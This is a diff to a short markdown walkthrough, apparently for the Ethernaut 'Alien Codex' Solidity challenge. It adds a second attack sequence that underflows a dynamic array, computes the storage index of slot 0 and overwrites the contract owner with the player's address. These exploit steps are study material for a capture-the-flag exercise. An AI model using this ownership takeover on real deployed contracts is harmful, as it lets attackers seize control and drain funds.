@@ -21,3 +21,11 @@ For dynamic arrays, [the] slot stores the number of elements in the array (byte 
 4. Now we will get the owner address. i = BigInt(2**256) -BigInt(p) . The owner is in the in slot 0 in the bytes array.
 5. content = "0x" + '0'.repeat(24) + player.slice(2)  this is the one that we will replace.
 6. To switch with the owner contract await contract.revise(i,content) 
+
+
+## Attack2
+1. await contract.make_contact()
+2. await contract.retract()
+3. index = 2²⁵⁶ - 1 - uint(keccak256(1)) + 1 = 2²⁵⁶ - uint(keccak256(1))
+4. content = "0x" + '0'.repeat(24) + player.slice(2)  this is the one that we will replace.
+5. contract.revise(index,content) 
